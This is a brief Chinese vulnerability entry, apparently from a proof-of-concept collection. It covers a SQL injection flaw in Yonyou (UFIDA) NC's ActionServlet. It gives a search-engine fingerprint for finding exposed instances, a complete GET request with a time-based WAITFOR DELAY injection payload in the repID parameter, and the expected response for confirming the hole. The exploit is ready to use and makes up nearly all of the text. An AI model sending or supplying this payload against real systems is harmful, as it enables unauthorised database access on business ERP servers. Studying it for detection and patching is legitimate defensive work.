# 用友NC-com.ufida.web.action.ActionServletSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:5'--+&unitID=public HTTP/1.1`
- **响应特征**：200